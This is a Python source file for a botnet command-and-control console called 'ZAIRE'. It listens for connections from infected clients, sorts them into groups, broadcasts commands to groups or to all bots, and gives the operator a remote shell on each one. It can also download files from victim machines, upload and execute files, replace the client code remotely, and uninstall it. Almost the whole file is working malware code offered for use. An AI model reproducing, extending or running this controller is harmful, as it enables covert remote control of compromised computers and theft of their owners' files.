import socket
import time
from threading import Thread
#from tkinter import messagebox
#import tkinter as tk
import os

files = {}
bots = []
green = '\033[92m'
red = '\033[91m'
cyan = '\033[96m'

l = []
u_files = {}

logo = '''
   ________      ___       __  .______    _______
  |       /     /   \     |  | |   _  \  |   ____|
  `---/  /     /  ^  \    |  | |  |_)  | |  |__
     /  /     /  /_\  \   |  | |      /  |   __|
    /  /----./  _____  \  |  | |  |\  \_.|  |____
   /________/__/     \__\ |__| | _| `.__||_______|

 '''

HELP = "\n"
HELP += "  list                         - List bots\n"
HELP += "  select 0                     - Selects bot labeled 0\n"
HELP += "  listen 5050                  - Opens listener on port 5050\n"
HELP += "  listeners                    - Lists listeners\n"
HELP += "  group [group] [command]      - Sends given command to given group\n"
HELP += "  setgroup [bot] [group]       - Sets given bot to group\n"
HELP += "  help                         - Prints this menu\n"

def Listen(port):
    Print('[*] Listening on port '+str(port))
    l.append(str(port))
    while True:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0',int(port)))#5050
        s.listen(1)
        s,a = s.accept()
        s.send(b'version')
        end = b''
        data = s.recv(1024)
        end += data
        while data[-3:] != b'EOF':
            data = s.recv(1024)
            end += data
        if(end[-3:] == b'EOF'):
            end = end[:-3]
        version = end.decode()

        s.send(b'group')
        end = b''
        data = s.recv(1024)
        end += data
        while data[-3:] != b'EOF':
            data = s.recv(1024)
            end += data
        if(end[-3:] == b'EOF'):
            end = end[:-3]
        group = end.decode()

        Print('[+] New Client: '+str(a[0])+'. On listener: '+str(port))
        #msgbox('New Client',str(a[0]+' Connected.'))
        bots.append((s,a,version,group))

def msgbox(title,info):
    def o(title,info):
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(title,info)
    t = Thread(target=o,args=(title,info,))
    t.start()

def Recv(s):
    end = b''
    data = s.recv(1024)
    end += data
    while data[-3:] != b'EOF':
        data = s.recv(1024)
        end += data
    if(end[-3:] == b'EOF'):
        end = end[:-3]
    return(end.decode(errors="replace"))

def groupcmd(group,cmd):
    print('')
    if(group == 'all'):
        Print('[*] Sending command to all bots')
        for i in bots:
            Print('[+] Sending command to: '+str(i[1][0]))
            Print('[*] Response:')
            exec(i[0],cmd)
            print('')
        print('')
        return
    Print('[*] Sending commands to group: '+str(group))
    for i in bots:
        if(i[3] == group):
            Print('[+] Sending command to: '+str(i[1][0]))
            Print('[*] Response:')
            exec(i[0],cmd)
            print('')
    print('')

def listDir(p=True):
    u_files = {}
    n = 0
    for i in os.listdir(os.getcwd()):
        f = False
        try:
            f = open(i,'r')
            f.close()
            f = True
        except:
            try:
                f = open(i,'rb')
                f.close()
                f = True
            except:
                pass
        if(f):
            if(p):
                print('    Fil   '+str(n)+(' '*(5-int(len(str(n)))))+i)
            u_files[str(n)] = i
            n += 1
        else:
            if(p):
                print('    Dir        '+i)
    return u_files

def FfN(s,nn):
    s.send(b'ls')
    end = b''
    data = s.recv(1024)
    end += data
    while data[-3:] != b'EOF':
        data = s.recv(1024)
        end += data
    if(end[-3:] == b'EOF'):
        end = end[:-3]
    end = end.decode()
    files = {}
    n = 0
    for i in end.splitlines():
        o = i
        i = i.strip()
        if(i.startswith('Fil')):
            files[str(n)] = i[4:].strip()
            n += 1
    return files[str(nn)]

def listClientDir(s,p=True):
    s.send(b'ls')
    end = b''
    data = s.recv(1024)
    end += data
    while data[-3:] != b'EOF':
        data = s.recv(1024)
        end += data
    if(end[-3:] == b'EOF'):
        end = end[:-3]
    end = end.decode()
    files = {}
    n = 0
    for i in end.splitlines():
        o = i
        i = i.strip()
        if(i.startswith('Fil')):
            if(p):
                print(o.replace('       ','   '+str(n)+(' '*(5-len(str(n))))))
            files[str(n)] = i[4:].strip()
            n += 1
        else:
            if(p):
                print(o.replace('       ','        '))
    return files

def Interact(s):
    shell = False
    while True:
        if(shell):
            c = input('')
            if(c == 'exit'):
                shell = False
            s.send(c.encode())
            print(Recv(s),end="")
            continue
        else:
            c = input('\n-$ ')
        if(c == 'lls'):
            listDir()
            continue
        if(c == 'shell'):
            shell = True

        if(exec(s,c) == False):
            break

def exec(s,c):
    if(c.startswith("download")):
        filename_ = c[8:].strip()
        try:
            int(filename_)
            filename = FfN(s,int(filename_))
            c = c.split(' ')[0]+' '+str(filename)
        except:
            filename = filename_
        Print("[*] Downloading "+str(filename))
        s.send(c.encode())
        e = str(s.recv(1024).decode())
        if(e == 't'):
            pass
        elif(e == 'f'):
            Print('[-] Could not find file: '+str(filename))
        l = int(s.recv(1024).decode())
        end = b''
        data = s.recv(1024)
        end += data
        a = 0
        while data[-3:] != b'EOF':
            a += len(data)
            try:
                print(str((a/l)*100).split('.')[0]+'%', end="\r")
            except:
                pass
            data = s.recv(1024)
            end += data
        if(end[-3:] == b'EOF'):
            end = end[:-3]
        try:
            f = open(filename,'w')
            f.write(end.decode())
            f.close()
        except:
            f = open(filename,'wb')
            f.write(end)
            f.close()
        Print("[+] Downloaded Sucessfully")
    elif(c == "uninstall"):
        s.send(c.encode())
        while True:
            data = s.recv(1024).decode()
            if(data == 'EOF'):
                break
            Print(data)
        return False
    elif(c.startswith('upload')):
        filename_ = c[7:].strip()
        try:
            int(filename_)
            filename = listDir(p=False)[filename_]
            c = c.split(' ')[0]+' '+str(filename)
        except:
            filename = filename_
        Print('[*] Uploading '+str(filename))
        try:
            f = open(filename,'r')
            data = f.read().encode()
            f.close()
        except:
            try:
                f = open(filename,'rb')
                data = f.read()
                f.close()
            except:
                Print('[-] File "'+str(filename)+'" not found')
                return
        s.send(c.encode())
        l = len(data)
        a = 0
        b = 1024
        while data[a:b] != b'':
            try:
                print(str((a/l)*100).split('.')[0]+'%', end="\r")
            except:
                pass
            s.send(data[a:b])
            a += 1024
            b += 1024
        time.sleep(1)
        s.send(b'E')
        Print('\n[+] Sucessfully Uploaded')
        #s.send(b'EOF')
        #s.close()
    elif(c.startswith('update')):
        filename_ = c[7:].strip()
        try:
            int(filename_)
            filename = listDir(p=False)[filename_]
            c = c.split(' ')[0]+' '+str(filename)
        except:
            filename = filename_
        Print('[*] Updating code with: '+str(filename))
        try:
            f = open(filename,'r')
            data = f.read().encode()
            f.close()
        except:
            f = open(filename,'rb')
            data = f.read()
            f.close()
        s.send(c.encode())
        l = len(data)
        a = 0
        b = 1024
        while data[a:b] != b'':
            try:
                print(str((a/l)*100).split('.')[0]+'%', end="\r")
            except:
                pass
            s.send(data[a:b])
            a += 1024
            b += 1024
        Print('[*] Sent Code to client')
        time.sleep(1)
        s.send(b'E')
        end = b''
        data = s.recv(1024)
        end += data
        while data[-3:] != b'EOF':
            data = s.recv(1024)
            end += data
        if(end[-3:] == b'EOF'):
            end = end[:-3]
        Print(end.decode(errors="replace"))
        return False
        #s.send(b'EOF')
        #s.close()
    elif(c.startswith('vulnserver')):
        s.send(c.encode())
        data = s.recv(1024).decode()
        while(data!="EOF"):
            Print(data,shell)
            data = s.recv(1024).decode()

    elif(c == 'exit'):
        return False
    elif(c == 'close'):
        s.send(b'close')
        s.close()
        Print('Session closed.')
        return False
    elif(c.strip() == ''):
        return True
    elif(c == 'ls'):
        listClientDir(s)
    elif(c.startswith('del')):
        filename_ = c[3:].strip()
        try:
            int(filename_)
            filename = FfN(s,int(filename_))
            c = c.split(' ')[0]+' '+str(filename)
        except:
            filename = filename_
        SnR(s,c)
    elif(c.startswith('execute')):
        filename_ = c[7:].strip()
        try:
            int(filename_)
            filename = FfN(s,int(filename_))
            c = c.split(' ')[0]+' '+str(filename)
        except:
            filename = filename_
        SnR(s,c)
    else:
        SnR(s,c)

def SnR(s,c):
    s.send(c.encode())
    end = b''
    data = s.recv(1024)
    end += data
    while data[-3:] != b'EOF':
        data = s.recv(1024)
        end += data
    if(end[-3:] == b'EOF'):
        end = end[:-3]
    Print(end.decode(errors="replace"))

def ListBots():
    end = '\n'
    n = 0
    for i in bots:
        s = i[0]
        try:
            s.settimeout(3)
            s.send(b'C')
            s.recv(1024)
            s.recv(1024)
        except:
            del bots[int(n)]
            continue
        s.settimeout(None)
        end += '  '+str(n)+' | '+i[1][0]+' | '+i[2]+' | '+i[3]+'\n'
        n += 1
    end = '    '+str(n)+' Bot(s)\n           IP             Version          Group\n          ----           ---------        -------'+end
    Print(end)

def Print(data,shell=False):
    if(data.strip().startswith('[-]')):
        print(red+data+'\033[0m')
    elif(data.strip().startswith('[+]')):
        print(green+data+'\033[0m')
    elif(data.strip().startswith('[*]')):
        print(cyan+data+'\033[0m')
        #print(data.replace('[*]',cyan+'[*]\033[0m'))
    else:
        if(shell):
            print(data+'\033[0m',end='  ')
        else:
            print(data+'\033[0m')

def main():
    os.system('clear')
    print(logo)
    print(HELP)

    while True:
        c = input('[ZAIRE]-$ ')
        if(c == 'list'):
            ListBots()
        elif(c == 'help'):
            print(HELP)
        elif(c == 'clear'):
            os.system('clear')
        elif(c == 'lls'):
            print('')
            listDir()
            print('')
        elif(c == 'listeners'):
            if(len(l) == 0):
                print('No Listeners Opened.')
                continue
            print('')
            for i in l:
                print('Port:    '+str(i))
            print('')
        elif(c.startswith('setgroup')):
            n = int(c.split(' ')[1])
            try:
                bot = bots[n]
            except:
                Print('[-] Could not find bot '+str(n))
                continue
            group = c.split(' ')[2:][0]
            bot_s = bot[0]
            bot_a = bot[1]
            bot_v = bot[2]
            bot_g = group
            del bots[n]
            bots.append((bot_s,bot_a,bot_v,bot_g))
            bot_s.send(b'setgroup '+str(group).encode())
            data = Recv(bot_s)
            Print('[*] Bot '+str(n)+' Set to group: '+str(group))

        elif(c.startswith('group')):
            group = c.split(' ')[1]
            cmd = ''.join([(x+' ') for x in c.split(' ')[2:]]).strip()#''.joinc.split(' ')[2:]
            groupcmd(group.strip(),cmd.strip())

        elif(c.startswith('listen')):
            port = c[6:].strip()
            t = Thread(target=Listen,args=(port,))
            t.start()
        elif(c.startswith('select')):
            n = c[6:].strip()
            try:
                s = bots[int(n)][0]
            except:
                Print('[-] Bot '+str(n)+' Not Found')
                continue
            try:
                Interact(s)
            except Exception as e:
                Print('[-] Session died.')
                print(e)

main()
